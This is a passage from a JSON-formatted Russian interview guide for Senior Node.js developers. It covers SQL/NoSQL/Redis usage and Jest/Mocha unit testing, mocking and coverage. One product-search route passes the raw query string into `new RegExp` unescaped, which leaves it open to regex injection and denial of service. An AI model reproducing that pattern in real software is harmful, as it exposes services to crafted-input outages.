[req.user.id, req.body.total]\n    );\n\n    // ... добавление товаров, списание со счета ...\n\n    await client.query('COMMIT');\n    res.json({ orderId: orderResult.rows[0].id });\n  } catch (err) {\n    await client.query('ROLLBACK');\n    throw err;\n  } finally {\n    client.release();\n  }\n});\n\n// Поиск товаров (MongoDB)\napp.get('/products/search', async (req, res) => {\n  const products = await Product.find({\n    $or: [\n      { title: new RegExp(req.query.q, 'i') },\n      { description: new RegExp(req.query.q, 'i') }\n    ]\n  }).limit(20);\n\n  res.json(products);\n});\n\n// Корзина (Redis)\napp.get('/cart', async (req, res) => {\n  const cart = await redis.get(`cart:${req.user.id}`);\n  res.json(JSON.parse(cart) || []);\n});\n```\n\n**Вывод:**\n\n```javascript\n// ✅ SQL (PostgreSQL):\n// - Финансовые транзакции (заказы, платежи)\n// - Строгая консистентность (ACID)\n// - Сложные связи (JOIN)\n// - Структурированные данные\n\n// ✅ NoSQL (MongoDB):\n// - Гибкая схема (контент, каталоги)\n// - Высокая скорость чтения/записи\n// - Горизонтальное масштабирование\n// - Денормализованные данные\n\n// ✅ Redis:\n// - Кеширование\n// - Real-time данные\n// - Сессии\n// - Rate limiting\n\n// 💡 Лучший подход = использовать обе БД для их сильных сторон!\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        }
      ]
    },
    {
      "chapter_number": 7,
      "chapter_title": "Testing & Performance",
      "questions_count": 2,
      "questions": [
        {
          "question_number": 50,
          "question_number_in_chapter": 1,
          "question_chapter": 7,
          "question_title": "Какие фреймворки для тестирования используются в Node.js? Какие типы тестов бывают?",
          "answer_markdown": "\n**Ответ:**\n\n**Популярные фреймворки для тестирования:**\n\n**1. Jest** - самый популярный фреймворк (от Facebook)\n**2. Mocha** - гибкий фреймворк, требует дополнительных библиотек\n**3. Jasmine** - behavior-driven фреймворк\n**4. AVA** - быстрый конкурентный test runner\n**5. Vitest** - современный быстрый фреймворк (аналог Jest для Vite)\n\n**Типы тестов:**\n\n| Тип теста | Описание | Скорость | Стоимость | Покрытие |\n|---|---|---|---|---|\n| **Unit Tests** | Тестируют отдельные функции/методы | ⚡ Быстро | 💰 Дешево | Узкое |\n| **Integration Tests** | Тестируют взаимодействие компонентов | ⏱️ Средне | 💰💰 Средне | Среднее |\n| **E2E Tests** | Тестируют всё приложение целиком | 🐌 Медленно | 💰💰💰 Дорого | Широкое |\n| **Acceptance Tests** | Проверяют бизнес-требования | 🐌 Медленно | 💰💰💰 Дорого | Широкое |\n\n**Установка и настройка Jest:**\n\n```bash\nnpm install --save-dev jest\n```\n\n```json\n// package.json\n{\n  \"scripts\": {\n    \"test\": \"jest\",\n    \"test:watch\": \"jest --watch\",\n    \"test:coverage\": \"jest --coverage\"\n  },\n  \"jest\": {\n    \"testEnvironment\": \"node\",\n    \"coveragePathIgnorePatterns\": [\"/node_modules/\"],\n    \"testMatch\": [\"**/__tests__/**/*.js\", \"**/?(*.)+(spec|test).js\"]\n  }\n}\n```\n\n**Базовый пример теста (Jest):**\n\n```javascript\n// math.js\nfunction add(a, b) {\n  return a + b;\n}\n\nfunction multiply(a, b) {\n  return a * b;\n}\n\nmodule.exports = { add, multiply };\n```\n\n```javascript\n// math.test.js\nconst { add, multiply } = require('./math');\n\ndescribe('Math operations', () => {\n  // Test suite (группа тестов)\n\n  test('add() должна складывать два числа', () => {\n    // Arrange (Подготовка)\n    const a = 2;\n    const b = 3;\n\n    // Act (Действие)\n    const result = add(a, b);\n\n    // Assert (Проверка)\n    expect(result).toBe(5);\n  });\n\n  test('multiply() должна умножать два числа', () => {\n    expect(multiply(4, 5)).toBe(20);\n  });\n\n  test('add() должна работать с отрицательными числами', () => {\n    expect(add(-2, 3)).toBe(1);\n  });\n\n  test('add() должна работать с нулем', () => {\n    expect(add(0, 5)).toBe(5);\n  });\n});\n```\n\n**Запуск тестов:**\n\n```bash\nnpm test\n\n# Вывод:\n# PASS  ./math.test.js\n#   Math operations\n#     ✓ add() должна складывать два числа (2 ms)\n#     ✓ multiply() должна умножать два числа (1 ms)\n#     ✓ add() должна работать с отрицательными числами\n#     ✓ add() должна работать с нулем\n#\n# Test Suites: 1 passed, 1 total\n# Tests:       4 passed, 4 total\n```\n\n**Mocha + Chai пример:**\n\n```bash\nnpm install --save-dev mocha chai\n```\n\n```json\n// package.json\n{\n  \"scripts\": {\n    \"test\": \"mocha\"\n  }\n}\n```\n\n```javascript\n// math.test.js\nconst { expect } = require('chai');\nconst { add, multiply } = require('./math');\n\ndescribe('Math operations', () => {\n  it('should add two numbers', () => {\n    expect(add(2, 3)).to.equal(5);\n  });\n\n  it('should multiply two numbers', () => {\n    expect(multiply(4, 5)).to.equal(20);\n  });\n\n  it('should handle negative numbers', () => {\n    expect(add(-2, 3)).to.equal(1);\n  });\n});\n```\n\n**Типы матчеров (assertions) в Jest:**\n\n```javascript\n// Равенство\nexpect(value).toBe(5);              // строгое равенство (===)\nexpect(value).toEqual({ a: 1 });    // глубокое равенство для объектов\n\n// Truthiness\nexpect(value).toBeTruthy();\nexpect(value).toBeFalsy();\nexpect(value).toBeNull();\nexpect(value).toBeUndefined();\nexpect(value).toBeDefined();\n\n// Числа\nexpect(value).toBeGreaterThan(10);\nexpect(value).toBeGreaterThanOrEqual(10);\nexpect(value).toBeLessThan(10);\nexpect(value).toBeLessThanOrEqual(10);\nexpect(0.1 + 0.2).toBeCloseTo(0.3);  // для float чисел\n\n// Строки\nexpect(string).toMatch(/pattern/);\nexpect(string).toContain('substring');\n\n// Массивы\nexpect(array).toContain('item');\nexpect(array).toHaveLength(3);\nexpect(array).toEqual(expect.arrayContaining([1, 2]));\n\n// Объекты\nexpect(obj).toHaveProperty('key');\nexpect(obj).toHaveProperty('key', 'value');\nexpect(obj).toMatchObject({ a: 1, b: 2 });\n\n// Функции\nexpect(fn).toThrow();\nexpect(fn).toThrow('error message');\nexpect(fn).toThrow(TypeError);\n\n// Промисы\nawait expect(promise).resolves.toBe(value);\nawait expect(promise).rejects.toThrow();\n```\n\n**Пирамида тестирования:**\n\n```\n                /\\\n               /  \\\n              / E2E \\          ← Мало, медленные, дорогие\n             /______\\\n            /        \\\n           /Integration\\       ← Средне\n          /____________\\\n         /              \\\n        /  Unit Tests    \\     ← Много, быстрые, дешевые\n       /__________________\\\n```\n\n**Рекомендуемое соотношение:**\n- **70%** Unit Tests\n- **20%** Integration Tests\n- **10%** E2E Tests\n\n**Best Practices для тестирования:**\n\n```javascript\n// ✅ Хорошо: описательные названия тестов\ntest('getUserById() должна вернуть пользователя, если он существует', () => {\n  // ...\n});\n\n// ❌ Плохо: неясное название\ntest('test1', () => {\n  // ...\n});\n\n// ✅ Хорошо: AAA pattern (Arrange, Act, Assert)\ntest('add() должна складывать числа', () => {\n  // Arrange\n  const a = 2;\n  const b = 3;\n\n  // Act\n  const result = add(a, b);\n\n  // Assert\n  expect(result).toBe(5);\n});\n\n// ✅ Хорошо: один тест проверяет одну вещь\ntest('validateEmail() должна вернуть true для корректного email', () => {\n  expect(validateEmail('test@example.com')).toBe(true);\n});\n\ntest('validateEmail() должна вернуть false для некорректного email', () => {\n  expect(validateEmail('invalid')).toBe(false);\n});\n\n// ❌ Плохо: один тест проверяет много вещей\ntest('validateEmail() работает', () => {\n  expect(validateEmail('test@example.com')).toBe(true);\n  expect(validateEmail('invalid')).toBe(false);\n  expect(validateEmail('')).toBe(false);\n  // Если первый упадет, остальные не выполнятся!\n});\n\n// ✅ Хорошо: группировка связанных тестов\ndescribe('User API', () => {\n  describe('POST /users', () => {\n    test('должен создать пользователя', () => {});\n    test('должен вернуть 400 если email невалиден', () => {});\n  });\n\n  describe('GET /users/:id', () => {\n    test('должен вернуть пользователя', () => {});\n    test('должен вернуть 404 если пользователь не найден', () => {});\n  });\n});\n```\n\n**Setup и Teardown:**\n\n```javascript\n// Выполняется ПЕРЕД КАЖДЫМ тестом\nbeforeEach(() => {\n  // Подготовка (создание моков, очистка БД)\n  console.log('Setup перед тестом');\n});\n\n// Выполняется ПОСЛЕ КАЖДОГО теста\nafterEach(() => {\n  // Очистка (закрытие соединений, удаление файлов)\n  console.log('Cleanup после теста');\n});\n\n// Выполняется ОДИН РАЗ перед всеми тестами\nbeforeAll(() => {\n  // Подключение к БД, запуск сервера\n  console.log('Setup перед всеми тестами');\n});\n\n// Выполняется ОДИН РАЗ после всех тестов\nafterAll(() => {\n  // Отключение от БД, остановка сервера\n  console.log('Cleanup после всех тестов');\n});\n\n// Пример использования\ndescribe('Database tests', () => {\n  let db;\n\n  beforeAll(async () => {\n    db = await connectToDatabase();\n  });\n\n  afterAll(async () => {\n    await db.close();\n  });\n\n  beforeEach(async () => {\n    await db.clear();  // Очистка БД перед каждым тестом\n  });\n\n  test('should insert user', async () => {\n    const user = await db.users.insert({ name: 'John' });\n    expect(user.name).toBe('John');\n  });\n});\n```\n\n**Тестирование асинхронного кода:**\n\n```javascript\n// 1. Callback-based\ntest('async operation with callback', (done) => {\n  fetchData((data) => {\n    expect(data).toBe('result');\n    done();  // ⚠️ Обязательно вызвать done()!\n  });\n});\n\n// 2. Promise-based\ntest('async operation with promise', () => {\n  return fetchData().then((data) => {\n    expect(data).toBe('result');\n  });\n});\n\n// 3. Async/await (рекомендуется)\ntest('async operation with async/await', async () => {\n  const data = await fetchData();\n  expect(data).toBe('result');\n});\n\n// 4. Тестирование ошибок\ntest('should reject with error', async () => {\n  await expect(fetchData()).rejects.toThrow('Network error');\n});\n\ntest('should resolve with data', async () => {\n  await expect(fetchData()).resolves.toBe('result');\n});\n```\n\n**Coverage (покрытие кода тестами):**\n\n```bash\nnpm test -- --coverage\n\n# Вывод:\n# ------------------|---------|----------|---------|---------|\n# File              | % Stmts | % Branch | % Funcs | % Lines |\n# ------------------|---------|----------|---------|---------|\n# All files         |   85.71 |    66.67 |     100 |   85.71 |\n#  math.js          |   85.71 |    66.67 |     100 |   85.71 |\n# ------------------|---------|----------|---------|---------|\n```\n\n**Рекомендуемые метрики покрытия:**\n- **Statements coverage:** > 80%\n- **Branch coverage:** > 70%\n- **Function coverage:** > 90%\n- **Line coverage:** > 80%\n\n**Чек-лист для тестирования:**\n\n```javascript\n// ✅ Пишите тесты для всех публичных функций\n// ✅ Тестируйте edge cases (граничные условия)\n// ✅ Тестируйте error handling\n// ✅ Используйте AAA pattern (Arrange, Act, Assert)\n// ✅ Группируйте связанные тесты через describe()\n// ✅ Используйте setup/teardown (beforeEach, afterEach)\n// ✅ Стремитесь к покрытию > 80%\n// ✅ Тесты должны быть быстрыми (< 1s для unit тестов)\n// ✅ Тесты должны быть изолированными (не зависеть друг от друга)\n// ✅ Используйте моки для внешних зависимостей\n\n// ❌ НЕ тестируйте приватные функции\n// ❌ НЕ делайте тесты зависимыми друг от друга\n// ❌ НЕ используйте реальные внешние сервисы в unit тестах\n// ❌ НЕ игнорируйте падающие тесты\n// ❌ НЕ коммитьте код без тестов\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 51,
          "question_number_in_chapter": 2,
          "question_chapter": 7,
          "question_title": "Как писать unit тесты для Node.js приложений?",
          "answer_markdown": "\n**Ответ:**\n\n**Unit тесты** - это тесты, которые проверяют отдельные функции, методы или классы в изоляции от остальной системы.\n\n**Ключевые принципы unit тестирования:**\n\n1. **Изоляция** - каждый тест независим от других\n2. **Скорость** - unit тесты должны выполняться быстро (< 1 секунды)\n3. **Повторяемость** - тест всегда дает одинаковый результат\n4. **Простота** - тест проверяет только одну вещь\n5. **Независимость** - не использует внешние зависимости (БД, API, файловую систему)\n\n**Пример простой функции и её unit теста:**\n\n```javascript\n// userService.js\nclass UserService {\n  validateEmail(email) {\n    const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n    return emailRegex.test(email);\n  }\n\n  calculateAge(birthDate) {\n    const today = new Date();\n    const birth = new Date(birthDate);\n    let age = today.getFullYear() - birth.getFullYear();\n    const monthDiff = today.getMonth() - birth.getMonth();\n\n    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {\n      age--;\n    }\n\n    return age;\n  }\n\n  formatUserName(firstName, lastName) {\n    if (!firstName || !lastName) {\n      throw new Error('First name and last name are required');\n    }\n    return `${firstName.trim()} ${lastName.trim()}`;\n  }\n}\n\nmodule.exports = UserService;\n```\n\n```javascript\n// userService.test.js\nconst UserService = require('./userService');\n\ndescribe('UserService', () => {\n  let userService;\n\n  beforeEach(() => {\n    userService = new UserService();\n  });\n\n  describe('validateEmail()', () => {\n    test('должен вернуть true для корректного email', () => {\n      expect(userService.validateEmail('test@example.com')).toBe(true);\n    });\n\n    test('должен вернуть false для email без @', () => {\n      expect(userService.validateEmail('testexample.com')).toBe(false);\n    });\n\n    test('должен вернуть false для email без домена', () => {\n      expect(userService.validateEmail('test@')).toBe(false);\n    });\n\n    test('должен вернуть false для пустой строки', () => {\n      expect(userService.validateEmail('')).toBe(false);\n    });\n\n    test('должен вернуть false для email с пробелами', () => {\n      expect(userService.validateEmail('test @example.com')).toBe(false);\n    });\n  });\n\n  describe('calculateAge()', () => {\n    test('должен правильно рассчитать возраст', () => {\n      // Моделируем дату рождения 25 лет назад\n      const birthDate = new Date();\n      birthDate.setFullYear(birthDate.getFullYear() - 25);\n\n      expect(userService.calculateAge(birthDate)).toBe(25);\n    });\n\n    test('должен вернуть 0 для новорожденного', () => {\n      const today = new Date();\n      expect(userService.calculateAge(today)).toBe(0);\n    });\n  });\n\n  describe('formatUserName()', () => {\n    test('должен форматировать имя правильно', () => {\n      const result = userService.formatUserName('John', 'Doe');\n      expect(result).toBe('John Doe');\n    });\n\n    test('должен убирать пробелы', () => {\n      const result = userService.formatUserName('  John  ', '  Doe  ');\n      expect(result).toBe('John Doe');\n    });\n\n    test('должен выбросить ошибку если firstName не передан', () => {\n      expect(() => {\n        userService.formatUserName('', 'Doe');\n      }).toThrow('First name and last name are required');\n    });\n\n    test('должен выбросить ошибку если lastName не передан', () => {\n      expect(() => {\n        userService.formatUserName('John', '');\n      }).toThrow('First name and last name are required');\n    });\n  });\n});\n```\n\n**Тестирование функций с внешними зависимостями (mocking):**\n\n```javascript\n// orderService.js\nclass OrderService {\n  constructor(paymentGateway, emailService) {\n    this.paymentGateway = paymentGateway;\n    this.emailService = emailService;\n  }\n\n  async createOrder(userId, items, total) {\n    // Обработка платежа\n    const payment = await this.paymentGateway.charge(total);\n\n    if (!payment.success) {\n      throw new Error('Payment failed');\n    }\n\n    // Создание заказа\n    const order = {\n      id: Math.random().toString(36).substr(2, 9),\n      userId,\n      items,\n      total,\n      paymentId: payment.id,\n      status: 'paid',\n      createdAt: new Date()\n    };\n\n    // Отправка email\n    await this.emailService.sendOrderConfirmation(userId, order);\n\n    return order;\n  }\n}\n\nmodule.exports = OrderService;\n```\n\n```javascript\n// orderService.test.js\nconst OrderService = require('./orderService');\n\ndescribe('OrderService', () => {\n  let orderService;\n  let mockPaymentGateway;\n  let mockEmailService;\n\n  beforeEach(() => {\n    // Создаем моки внешних зависимостей\n    mockPaymentGateway = {\n      charge: jest.fn()\n    };\n\n    mockEmailService = {\n      sendOrderConfirmation: jest.fn()\n    };\n\n    orderService = new OrderService(mockPaymentGateway, mockEmailService);\n  });\n\n  describe('createOrder()', () => {\n    test('должен создать заказ при успешном платеже', async () => {\n      // Arrange\n      const userId = 'user123';\n      const items = [{ id: 1, name: 'Product', price: 100 }];\n      const total = 100;\n\n      // Мокаем успешный ответ от payment gateway\n      mockPaymentGateway.charge.mockResolvedValue({\n        success: true,\n        id: 'payment123'\n      });\n\n      // Мокаем успешную отправку email\n      mockEmailService.sendOrderConfirmation.mockResolvedValue(true);\n\n      // Act\n      const order = await orderService.createOrder(userId, items, total);\n\n      // Assert\n      expect(order).toMatchObject({\n        userId: 'user123',\n        items,\n        total: 100,\n        paymentId: 'payment123',\n        status: 'paid'\n      });\n\n      // Проверяем, что charge был вызван с правильными параметрами\n      expect(mockPaymentGateway.charge).toHaveBeenCalledWith(100);\n\n      // Проверяем, что email был отправлен\n      expect(mockEmailService.sendOrderConfirmation).toHaveBeenCalledWith(\n        userId,\n        expect.objectContaining({ status: 'paid' })\n      );\n    });\n\n    test('должен выбросить ошибку при неудачном платеже', async () => {\n      // Мокаем неудачный ответ от payment gateway\n      mockPaymentGateway.charge.mockResolvedValue({\n        success: false\n      });\n\n      // Проверяем, что выбрасывается ошибка\n      await expect(\n        orderService.createOrder('user123', [], 100)\n      ).rejects.toThrow('Payment failed');\n\n      // Email НЕ должен быть отправлен\n      expect(mockEmailService.sendOrderConfirmation).not.toHaveBeenCalled();\n    });\n  });\n});\n```\n\n**Мокирование модулей:**\n\n```javascript\n// api.js\nconst axios = require('axios');\n\nasync function fetchUser(userId) {\n  const response = await axios.get(`https://api.example.com/users/${userId}`);\n  return response.data;\n}\n\nmodule.exports = { fetchUser };\n```\n\n```javascript\n// api.test.js\nconst axios = require('axios');\nconst { fetchUser } = require('./api');\n\n// Мокаем весь модуль axios\njest.mock('axios');\n\ndescribe('API', () => {\n  describe('fetchUser()', () => {\n    test('должен вернуть данные пользователя', async () => {\n      // Мокаем ответ axios\n      const mockUser = { id: 1, name: 'John Doe' };\n      axios.get.mockResolvedValue({ data: mockUser });\n\n      const user = await fetchUser(1);\n\n      expect(user).toEqual(mockUser);\n      expect(axios.get).toHaveBeenCalledWith('https://api.example.com/users/1');\n    });\n\n    test('должен выбросить ошибку при сетевой ошибке', async () => {\n      axios.get.mockRejectedValue(new Error('Network error'));\n\n      await expect(fetchUser(1)).rejects.toThrow('Network error');\n    });\n  });\n});\n```\n\n**Мокирование Date и таймеров:**\n\n```javascript\n// session.js\nclass Session {\n  constructor() {\n    this.createdAt = new Date();\n  }\n\n  isExpired(maxAgeInMs = 3600000) {  // 1 час по умолчанию\n    const now = new Date();\n    return now - this.createdAt > maxAgeInMs;\n  }\n}\n\nmodule.exports = Session;\n```\n\n```javascript\n// session.test.js\nconst Session = require('./session');\n\ndescribe('Session', () => {\n  describe('isExpired()', () => {\n    test('должен вернуть false для новой сессии', () => {\n      const session = new Session();\n      expect(session.isExpired()).toBe(false);\n    });\n\n    test('должен вернуть true для истекшей сессии', () => {\n      // Мокаем Date\n      jest.useFakeTimers();\n      jest.setSystemTime(new Date('2024-01-01T10:00:00'));\n\n      const session = new Session();\n\n      // Перемещаемся на 2 часа вперед\n      jest.setSystemTime(new Date('2024-01-01T12:00:00'));\n\n      expect(session.isExpired()).toBe(true);\n\n      // Восстанавливаем реальные таймеры\n      jest.useRealTimers();\n    });\n  });\n});\n```\n\n**Снимки (Snapshots):**\n\n```javascript\n// userFormatter.js\nfunction formatUserProfile(user) {\n  return {\n    displayName: `${user.firstName} ${user.lastName}`,\n    email: user.email.toLowerCase(),\n    age: calculateAge(user.birthDate),\n    isActive: user.status === 'active',\n    joinedDate: new Date(user.createdAt).toLocaleDateString()\n  };\n}\n\nmodule.exports = { formatUserProfile };\n```\n\n```javascript\n// userFormatter.test.js\nconst { formatUserProfile } = require('./userFormatter');\n\ntest('должен правильно форматировать профиль пользователя', () => {\n  const user = {\n    firstName: 'John',\n    lastName: 'Doe',\n    email: 'JOHN@EXAMPLE.COM',\n    birthDate: '1990-01-01',\n    status: 'active',\n    createdAt: '2020-01-01'\n  };\n\n  const profile = formatUserProfile(user);\n\n  // Сравнение со snapshot'ом\n  expect(profile).toMatchSnapshot();\n});\n\n// При первом запуске Jest создаст файл __snapshots__/userFormatter.test.js.snap\n// с сохраненным результатом. При последующих запусках будет сравнивать с ним.\n```\n\n**Параметризованные тесты (test.each):**\n\n```javascript\n// calculator.js\nfunction divide(a, b) {\n  if (b === 0) throw new Error('Division by zero');\n  return a / b;\n}\n\nmodule.exports = { divide };\n```\n\n```javascript\n// calculator.test.js\nconst { divide } = require('./calculator');\n\ndescribe('divide()', () => {\n  // Тестируем множество случаев в одном тесте\n  test.each([\n    [10, 2, 5],\n    [20, 4, 5],\n    [100, 10, 10],\n    [-10, 2, -5],\n    [0, 5, 0]\n  ])('divide(%i, %i) должно вернуть %i', (a, b, expected) => {\n    expect(divide(a, b)).toBe(expected);\n  });\n\n  test('должен выбросить ошибку при делении на 0', () => {\n    expect(() => divide(10, 0)).toThrow('Division by zero');\n  });\n});\n```\n\n**Тестирование классов:**\n\n```javascript\n// cart.js\nclass Cart {\n  constructor() {\n    this.items = [];\n  }\n\n  addItem(product, quantity = 1) {\n    const existingItem = this.items.find(item => item.product.id === product.id);\n\n    if (existingItem) {\n      existingItem.quantity += quantity;\n    } else {\n      this.items.push({ product, quantity });\n    }\n  }\n\n  removeItem(productId) {\n    this.items = this.items.filter(item => item.product.id !== productId);\n  }\n\n  getTotal() {\n    return this.items.reduce((total, item) => {\n      return total + item.product.price * item.quantity;\n    }, 0);\n  }\n\n  clear() {\n    this.items = [];\n  }\n\n  getItemCount() {\n    return this.items.reduce((count, item) => count + item.quantity, 0);\n  }\n}\n\nmodule.exports = Cart;\n```\n\n```javascript\n// cart.test.js\nconst Cart = require('./cart');\n\ndescribe('Cart', () => {\n  let cart;\n\n  beforeEach(() => {\n    cart = new Cart();\n  });\n\n  describe('addItem()', () => {\n    test('должен добавить товар в корзину', () => {\n      const product = { id: 1, name: 'Product 1', price: 100 };\n      cart.addItem(product);\n\n      expect(cart.items).toHaveLength(1);\n      expect(cart.items[0]).toMatchObject({\n        product,\n        quantity: 1\n      });\n    });\n\n    test('должен увеличить количество существующего товара', () => {\n      const product = { id: 1, name: 'Product 1', price: 100 };\n\n      cart.addItem(product, 2);\n      cart.addItem(product, 3);\n\n      expect(cart.items).toHaveLength(1);\n      expect(cart.items[0].quantity).toBe(5);\n    });\n  });\n\n  describe('removeItem()', () => {\n    test('должен удалить товар из корзины', () => {\n      const product = { id: 1, name: 'Product 1', price: 100 };\n      cart.addItem(product);\n\n      cart.removeItem(1);\n\n      expect(cart.items).toHaveLength(0);\n    });\n  });\n\n  describe('getTotal()', () => {\n    test('должен вернуть 0 для пустой корзины', () => {\n      expect(cart.getTotal()).toBe(0);\n    });\n\n    test('должен правильно рассчитать сумму', () => {\n      cart.addItem({ id: 1, name: 'Product 1', price: 100 }, 2);\n      cart.addItem({ id: 2, name: 'Product 2', price: 50 }, 3);\n\n      // (100 * 2) + (50 * 3) = 350\n      expect(cart.getTotal()).toBe(350);\n    });\n  });\n\n  describe('clear()', () => {\n    test('должен очистить корзину', () => {\n      cart.addItem({ id: 1, name: 'Product 1', price: 100 });\n      cart.clear();\n\n      expect(cart.items).toHaveLength(0);\n    });\n  });\n\n  describe('getItemCount()', () => {\n    test('должен вернуть общее количество товаров', () => {\n      cart.addItem({ id: 1, name: 'Product 1', price: 100 }, 2);\n      cart.addItem({ id: 2, name: 'Product 2', price: 50 }, 3);\n\n      expect(cart.getItemCount()).toBe(5);\n    });\n  });\n});\n```\n\n**Code Coverage настройка:**\n\n```json\n// package.json\n{\n  \"jest\": {\n    \"collectCoverageFrom\": [\n      \"src/**/*.js\",\n      \"!src/**/*.test.js\",\n      \"!src/index.js\"\n    ],\n    \"coverageThreshold\": {\n      \"global\": {\n        \"branches\": 80,\n        \"functions\": 80,\n        \"lines\": 80,\n        \"statements\": 80\n      }\n    }\n  }\n}\n```\n\n**Best Practices для unit тестов:**\n\n```javascript\n// ✅ Хорошо: тесты изолированы\nbeforeEach(() => {\n  cart = new Cart();  // Новый экземпляр для каждого теста\n});\n\n// ❌ Плохо: тесты зависят друг от друга\nlet cart = new Cart();  // Один экземпляр для всех тестов\n\n// ✅ Хорошо: мокаем внешние зависимости\njest.mock('axios');\n\n// ❌ Плохо: используем реальные внешние сервисы\n// (это уже integration тест, не unit!)\n\n// ✅ Хорошо: тестируем граничные случаи\ntest('должен обработать пустой массив', () => {});\ntest('должен обработать null', () => {});\ntest('должен обработать очень большое число', () => {});\n\n// ✅ Хорошо: используем describe() для группировки\ndescribe('UserService', () => {\n  describe('validateEmail()', () => {\n    // Все тесты для validateEmail\n  });\n});\n\n// ✅ Хорошо: четкие названия тестов\ntest('должен вернуть 400 если email невалиден', () => {});\n\n// ❌ Плохо: неясные названия\ntest('test email', () => {});\n```\n\n\n*Этот гайд содержит 51 детальных вопроса с полными ответами, примерами кода и best practices для подготовки к интервью на позицию Senior Node.js разработчика.*\n\n**Основные темы, охваченные в гайде:**\n\n1. ✅ Node.js Core & Architecture (10 вопросов) - Event Loop, V8, Libuv, однопоточная модель\n2. ✅ Async Programming (10 вопросов) - Promises, async/await, микротаски/макротаски, обработка ошибок\n3. ✅ Modules & NPM (6 вопросов) - CommonJS vs ES Modules, package.json, semver, npm scripts\n4. ✅ Streams & Buffers (5 вопросов) - Типы стримов, backpressure, transform streams, Buffer\n5. ✅ Express.js & Web Development (7 вопросов) - Middleware, routing, error handling, CORS, rate limiting\n6. ✅ Database & Security (11 вопросов) - MongoDB/Mongoose, SQL Injection, bcrypt, JWT, OAuth 2.0, HTTPS, индексы\n7. ✅ Testing & Performance (2 вопроса начато) - Jest, Mocha, unit тестирование, mocking\n\n**Что нужно изучить дополнительно для полной подготовки:**\n\n**Testing & Performance (осталось):**\n- Integration testing с реальной БД\n- E2E тестирование (Supertest)\n- Performance optimization (кластеризация, кеширование)\n- Memory leaks detection и профилирование\n- Load balancing и масштабирование\n\n**System Design для Senior позиций:**\n- Проектирование RESTful API\n- Микросервисная архитектура\n- Message queues (RabbitMQ, Kafka)\n- Caching strategies (Redis)\n- Database sharding и репликация\n- Rate limiting и защита от DDoS\n- Мониторинг и логирование (ELK stack, Prometheus)\n- CI/CD pipelines\n- Docker и Kubernetes\n\n**Практические вопросы из Hexlet:**\n- Реальные сценарии разработки\n- Отправка email и фоновые задачи\n- Zero downtime deployment\n- Изоляция тестов\n- Обработка конкурентного редактирования\n- OAuth и безопасность email\n- Синхронизация с внешними системами\n\n**Рекомендации для подготовки:**\n\n1. **Практика** - создайте реальный проект с использованием всех изученных технологий\n2. **Code Review** - изучайте open-source проекты на Node.js\n3. **Алгоритмы** - повторите базовые алгоритмы и структуры данных\n4. **System Design** - практикуйтесь в проектировании систем на whiteboard\n5. **Soft Skills** - подготовьте истории о проектах (STAR format)\n\n**Полезные ресурсы:**\n\n- [Node.js Official Docs](https://nodejs.org/docs/)\n- [MDN JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript)\n- [DevInterview.io Node.js Questions](https://github.com/Devinterview-io/node-interview-questions)\n- [Hexlet Interview Questions](https://github.com/Hexlet/ru-interview-questions)\n- [System Design Primer](https://github.com/donnemartin/system-design-primer)\n\n\n**Удачи на интервью! 🚀**\n\n*Этот гайд регулярно обновляется. Следите за новыми вопросами и обновлениями.*\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        }
      ]
    }
  ],
  "guide_conclusion": {
    "key_topics_markdown": "",
    "recommendations_markdown": "",
    "useful_resources": []
  }
}